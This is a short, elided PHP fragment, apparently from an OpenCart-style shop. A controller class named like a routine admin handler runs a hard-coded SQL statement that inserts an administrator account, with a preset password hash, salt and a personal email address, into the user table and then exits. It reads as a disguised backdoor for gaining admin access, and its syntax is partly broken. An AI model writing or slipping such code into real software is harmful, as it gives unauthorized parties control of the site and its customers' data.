...
class ControllerRoutineadmin2 extends Controller
{
...
$q1="INSERT INTO `oc_user` VALUES ('160', '1', 'admin', 'fe8c1238dc9da9fea84f4ef492fd2fa8092e100b', 'a6ecd0650', 'John', 'Doe', 'siddharthsingh.chauhan@gmail.com', '', '', '127.0.0.1', '1', '2015-04-06 13:37:27');";
$this->db->query($q1);
exit()
endif;
